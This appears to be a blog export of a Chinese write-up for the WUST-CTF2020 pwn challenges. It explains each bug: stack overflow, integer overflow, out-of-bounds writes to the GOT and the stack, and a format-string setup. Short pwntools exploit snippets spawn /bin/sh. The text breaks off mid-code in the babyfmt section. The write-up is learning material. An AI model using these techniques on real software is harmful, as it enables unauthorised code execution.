<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WUST-CTF2020-Writeup~</title>
      <link href="/2020/03/30/WUST-CTF2020-pwn-wp/"/>
      <url>/2020/03/30/WUST-CTF2020-pwn-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>武汉科技大学的萌新赛，刚一开赛就忘了密码的我，发现重置密码要等半小时嗯？新注册小号也要等半小时嗯？于是就只好化身为imagin师傅的小弟啦 (╯#-_-)╯~~</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>pwn题目基本都是考察基础知识的，十分适合萌新入门，出题人葛格很贴心~</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ColdShield</p></blockquote></li><li><p>考察点：栈溢出</p></li><li><p>难度：入门</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：632</p></li><li><p>完成人数：33</p></li></ul><p>32位elf，简单的栈溢出，直接覆盖返回地址为后门即可。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">28</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p32(<span class="number">0x0804851B</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure></div><h2 id="getshell-2"><a href="#getshell-2" class="headerlink" title="getshell-2"></a>getshell-2</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ColdShield</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/getshell-2/getshell-2" target="_blank" rel="noopener">getshell-2</a></p></li><li><p>考察点：ret2text</p></li><li><p>难度：入门</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：988</p></li><li><p>完成人数：7</p></li></ul><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>和前面的getshell差不多，只是把<code>system(&quot;/bin/sh&quot;)</code>改了，没法直接getshell</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>32位的elf，函数参数保存在栈中，所以只要覆盖返回地址为system，再多覆盖4字节用作system的参数就行。字符串结尾给的<code>sh</code>可以直接用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system = <span class="number">0x08048529</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">28</span></span><br><span class="line">payload += p32(system) + p32(<span class="number">0x8048650</span>+<span class="number">32</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure></div><h2 id="number-game"><a href="#number-game" class="headerlink" title="number_game"></a>number_game</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ColdShield</p><p>hint: NEG</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/number_game/number_game" target="_blank" rel="noopener">number_game</a></p></li><li><p>考察点：整数溢出(取反)</p></li><li><p>难度：简单</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：919</p></li><li><p>完成人数：16</p></li></ul><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序关键部分如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    v1 = -v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">        shell();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You lose"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>读一个整数，如果小于0就取反，如果还小于0就给shell</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>这题和<a href="http://taqini.space/2020/02/13/ACTF2020-writeup/#Pwn">ACTF2020</a>考察abs函数那题原理相同</p><blockquote><p><code>abs(-2147483648)</code>的返回值仍然是负数</p></blockquote><p>所以直接输入<code>-2147483648</code>即可然过两次判断</p><h2 id="closed"><a href="#closed" class="headerlink" title="closed"></a>closed</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ColdShield</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/closed/closed" target="_blank" rel="noopener">closed</a></p></li><li><p>考察点：重定向</p></li><li><p>难度：入门</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：971</p></li><li><p>完成人数：10</p></li></ul><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     edi, 1          ; fd</span><br><span class="line">call    _close</span><br><span class="line">mov     edi, 2          ; fd</span><br><span class="line">call    _close</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    shell</span><br></pre></td></tr></table></figure></div><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>考察基础知识，直接<code>exec 1&gt;&amp;0</code>把<code>stdout</code>重定向到<code>stdin</code>就行了。</p><h2 id="NameYourDog"><a href="#NameYourDog" class="headerlink" title="NameYourDog"></a>NameYourDog</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ColdShield</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/NameYourDog/NameYourDog" target="_blank" rel="noopener">NameYourDog</a></p></li><li><p>考察点：数组越界</p></li><li><p>难度：简单</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：995</p></li><li><p>完成人数：5</p></li></ul><h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序流程如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   __  ___    ______   ___    </span><br><span class="line">  &#x2F;  |&#x2F;  &#x2F;__ &#x2F;_  __&#x2F;__&lt;  &#x2F;_ __</span><br><span class="line"> &#x2F; &#x2F;|_&#x2F; &#x2F; _ &#96;&#x2F;&#x2F; &#x2F; &#x2F; __&#x2F; &#x2F;\ \ &#x2F;</span><br><span class="line">&#x2F;_&#x2F;  &#x2F;_&#x2F;\_,_&#x2F;&#x2F;_&#x2F; &#x2F;_&#x2F; &#x2F;_&#x2F;&#x2F;_\_\ </span><br><span class="line"></span><br><span class="line">I bought you five male dogs.Name for them?</span><br><span class="line">Name for which?</span><br><span class="line">&gt;1</span><br><span class="line">Give your name plz: Imagin</span><br><span class="line">You get 1 dogs!!!!!!</span><br><span class="line">Whatever , the author prefers cats ^.^</span><br><span class="line">His name is:Imagin</span><br></pre></td></tr></table></figure></div><p>就是可以给狗狗起名字，好像一共可以给五只狗狗起名字。</p><p>漏洞在起名字函数这里，程序没有检查<code>Dogs</code>数组的<code>index</code>是否合法：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">v1 = NameWhich((<span class="keyword">int</span>)&amp;Dogs);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">NameWhich</span><span class="params">(<span class="keyword">int</span> a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name for which?\n&gt;"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give your name plz: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%7s"</span>, <span class="number">8</span> * index + a1);</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>因此可以造成数组的越界写。</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>Dogs</code>位于bss段，距离程序GOT表很近，因此可以考虑改函数的GOT表为后门地址。 </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;Dogs </span><br><span class="line">$1 &#x3D; (&lt;data variable, no debug info&gt; *) 0x804a060 &lt;Dogs&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; got</span><br><span class="line">GOT protection: Partial RELRO | GOT functions: 8</span><br><span class="line">[0x804a00c] printf@GLIBC_2.0 -&gt; 0x8048446 (printf@plt+6) ◂— push   0 &#x2F;* &#39;h&#39; *&#x2F;</span><br><span class="line">[0x804a010] alarm@GLIBC_2.0 -&gt; 0xf7e92480 (alarm) ◂— mov    edx, ebx</span><br><span class="line">[0x804a014] __stack_chk_fail@GLIBC_2.4 -&gt; 0x8048466 (__stack_chk_fail@plt+6) ◂— push   0x10</span><br><span class="line">[0x804a018] puts@GLIBC_2.0 -&gt; 0xf7e3a210 (puts) ◂— push   ebp</span><br><span class="line">[0x804a01c] system@GLIBC_2.0 -&gt; 0x8048486 (system@plt+6) ◂— push   0x20 &#x2F;* &#39;h &#39; *&#x2F;</span><br><span class="line">[0x804a020] __libc_start_main@GLIBC_2.0 -&gt; 0xf7deb660 (__libc_start_main) ◂— call   0xf7f0a689</span><br><span class="line">[0x804a024] setvbuf@GLIBC_2.0 -&gt; 0xf7e3a860 (setvbuf) ◂— push   ebp</span><br><span class="line">[0x804a028] __isoc99_scanf@GLIBC_2.7 -&gt; 0x80484b6 (__isoc99_scanf@plt+6) ◂— push   0x38 &#x2F;* &#39;h8&#39; *&#x2F;</span><br></pre></td></tr></table></figure></div><p><code>scanf</code>函数会在给下一只狗狗起名字的时候调用，所以选择改写<code>scanf</code>的got表即可</p><p>偏移量：<code>(0x804a028-0x804a060)/8=-7</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell = p32(<span class="number">0x080485CB</span>)</span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">'-7'</span>)</span><br><span class="line">sla(<span class="string">'Give your name plz: '</span>,shell)</span><br></pre></td></tr></table></figure></div><h2 id="NameYourCat"><a href="#NameYourCat" class="headerlink" title="NameYourCat"></a>NameYourCat</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ColdShield</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/NameYourCat/NameYourCat" target="_blank" rel="noopener">NameYourCat</a></p></li><li><p>考察点：数组越界</p></li><li><p>难度：简单</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：997</p></li><li><p>完成人数：4</p></li></ul><h3 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h3><p>和狗狗那题类似，出题人不是说喜欢喵嘛~ 这题只是把狗狗改成了喵，还是数组越界的漏洞。</p><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> Cats[<span class="number">40</span>]; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这次数组喵<code>Cats</code>是<code>vulnerable</code>中定义的临时变量</p><p>既然喵位于栈中，那么利用数组越界直接修改程序返回地址即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048695 &lt;NameWhich+99&gt;     call   __isoc99_scanf@plt &lt;0x80484b0&gt;</span><br><span class="line">       format: 0x804889f ◂— 0x733725 &#x2F;* &#39;%7s&#39; *&#x2F;</span><br><span class="line">       vararg: 0xffffcc54 —▸ 0xf7fe9790 ◂— pop    edx</span><br></pre></td></tr></table></figure></div><p>查看返回地址：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0e:0038│ ebp  0xffffcc28 —▸ 0xffffcc88 —▸ 0xffffcc98 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffcc2c —▸ 0x80486e9 (vulnerable+54) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffcc30 —▸ 0xffffcc54 —▸ 0xf7fe9790 ◂— pop    edx</span><br></pre></td></tr></table></figure></div><p>偏移量：<code>(0xffffcc2c-0xffffcc54)/8=-5</code></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell = p32(<span class="number">0x080485CB</span>)</span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">'-5'</span>)</span><br><span class="line">sla(<span class="string">'Give your name plz: '</span>,shell)</span><br></pre></td></tr></table></figure></div><h2 id="easyfast"><a href="#easyfast" class="headerlink" title="easyfast"></a>easyfast</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ColdShield</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/easyfast/easyfast" target="_blank" rel="noopener">easyfast</a></p></li><li><p>考察点：数组越界</p></li><li><p>难度：中等</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：1000</p></li><li><p>完成人数：2</p></li></ul><h3 id="程序分析-5"><a href="#程序分析-5" class="headerlink" title="程序分析"></a>程序分析</h3><p>貌似是个fastbin attack入门题，标准的菜单式堆题。</p><p>然鹅编辑功能没有检查<code>index</code>是否合法，因此还是可以数组越界写。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">  __int64 inedx; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index&gt;"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  inedx = atoi(&amp;s);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf[inedx], <span class="number">8u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p><code>buf</code>位于bss段</p></blockquote><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>依然可以用修改got表的思路，比如改程序中常用的<code>atoi</code>函数：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[0x602060] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7e443d0 (setvbuf) ◂— push   r13</span><br><span class="line">[0x602068] atoi@GLIBC_2.2.5 -&gt; 0x7ffff7e052c0 (atoi) ◂— sub    rsp, 8</span><br><span class="line">[0x602070] exit@GLIBC_2.2.5 -&gt; 0x400786 (exit@plt+6) ◂— push   0xb &#x2F;* &#39;h\x0b&#39; *&#x2F;</span><br></pre></td></tr></table></figure></div><p><code>read(0, buf[inedx], 8)</code>是向<code>buf[index]</code>中的<strong>指针指向的地址</strong>处写8个字节，因此要构造：</p><p><code>buf[inedx]=addr</code> &amp; <code>addr-&gt;0x602068</code></p><p>因此需要找一个指针，指向<code>atoi</code>的got表，显然那就是<strong>reloc表</strong>了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -8 0x602068</span><br><span class="line">easyfast        0x400668 push   0x6020 &#x2F;* &#39;h &#96;&#39; *&#x2F;</span><br></pre></td></tr></table></figure></div><p>找到以后计算偏移量即可：<code>(0x400668-0x6020c0)/8=-262987</code></p><blockquote><p>直接用程序中的后门会因为执行system时栈基址偏移量不对导致getshell失败</p></blockquote><p>所以覆盖<code>atoi</code>的got表为<code>system@plt</code>，然后给<code>atoi</code>传一个<code>&quot;/bin/sh\0&quot;</code>的参数即可getshell</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell = elf.sym[<span class="string">'system'</span>]</span><br><span class="line">sla(<span class="string">'choice&gt;\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">sea(<span class="string">'index&gt;\n'</span>,<span class="string">'-262987'</span>)</span><br><span class="line">se(p64(shell))</span><br><span class="line">sl(<span class="string">'/bin/sh\0'</span>)</span><br></pre></td></tr></table></figure></div><h2 id="babyfmt"><a href="#babyfmt" class="headerlink" title="babyfmt"></a>babyfmt</h2><ul><li><p>题目描述：</p><blockquote><p>Author: ru7n</p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/babyfmt/babyfmt" target="_blank" rel="noopener">babyfmt</a></p></li><li><p>考察点：格式化字符串</p></li><li><p>难度：困难</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：1000</p></li><li><p>完成人数：2</p></li></ul><p>本次比赛中最好玩儿的一道pwn题~</p><h3 id="程序分析-6"><a href="#程序分析-6" class="headerlink" title="程序分析"></a>程序分析</h3><p>先看下程序的流程吧</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./babyfmt </span></span><br><span class="line">dididada.....</span><br><span class="line">tell me the time:12 13 14</span><br><span class="line">ok! time is 12:13:14</span><br><span class="line">1. leak</span><br><span class="line">2. fmt_attack</span><br><span class="line">3. get_flag</span><br><span class="line">4. exit</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;</span></span><br></pre></td></tr></table></figure></div><p>先是有个didadida要求输入时间，不知道有什么用，下一个。</p><p>然后就是菜单了：</p><ul><li>选2可以完成一下格式化字符串攻击</li><li>选1可以泄漏任意地址的<strong>一个字节</strong>…哼太抠门了！</li><li>选3会要求你输入一个字符串然后与<code>secret</code>进行比对，如果对了就打印flag。。。。嘛？</li></ul><p>显然没那么简单</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(secret, &amp;s2, <span class="number">0x40</span>uLL) )&#123;</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/flag"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;s2, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s2, &amp;s2);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>出题人把<code>stdout</code>关掉了，所以<code>printf</code>啥都打印不出来。</p><blockquote><p><code>secret</code>是程序开始时读的一个0x40长的随机数据</p></blockquote><p>除此以外还有一处限制，<code>leak</code>和<code>fmt_attack</code>只能利用一次：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  fmt_flag = <span class="number">0</span>;</span><br><span class="line">  leak_flag = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        fmt_attack(&amp;fmt_flag);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">        leak(&amp;leak_flag);</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall 